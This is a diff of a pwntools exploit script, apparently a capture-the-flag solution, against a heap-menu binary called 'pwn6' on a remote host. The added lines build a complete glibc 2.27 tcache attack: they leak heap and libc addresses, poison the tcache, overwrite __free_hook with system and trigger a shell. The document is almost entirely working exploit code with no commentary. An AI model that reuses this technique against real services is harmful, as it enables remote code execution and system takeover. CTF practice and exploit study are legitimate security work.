@@ -2,9 +2,9 @@
 from pwn import *
 import time
 
+context.arch = 'amd64'
 e , l = ELF('./pwn6') , ELF( 'libc-2.27.so' )
 
-context.arch = 'amd64'
 host , port = '10.140.0.8' , 11116
 y = remote( host , port )
 #y = process( './pwn6' )
@@ -27,21 +27,42 @@ def magic( idx ):
     y.sendafter( ':' , str( idx ) )
 
 
+add( p64( 0x91 ) * 16 )
 add( 'a' )
 add( 'a' )
 dle(0)
 dle(1)
-
 add( 'b' )
 pri( 0 )
 
-
 print y.recv(6)
-
 heap = u64( y.recv(6) + '\x00\x00' ) - 0x262
-success( 'libc -> %s' % hex( heap ) )
+success( 'heap -> %s' % hex( heap ) )
 
-magic( 0 )
+magic(0)
 
+add( p64( heap + 0x10 ) )
+add( p64( 0 )  )
+add( '\x00' * 7 + '\x07' + p64(0)*14 + p64( heap + 0x2f0 ) )
+
+dle(0)
+
+add('b')
+pri(0)
+
+y.recv(6)
+l.address += u64( y.recv(6) + '\x00\x00' ) - 0x3ebc62
+success( 'libc -> %s' % hex( l.address ) )
+
+add( 'a' )
+
+dle(0)
+dle(1)
+
+add( p64( l.sym.__free_hook ) )
+add( 'sh\x00' )
+add( p64( l.sym.system ) )
+
+dle( 1 )
 
 y.interactive()
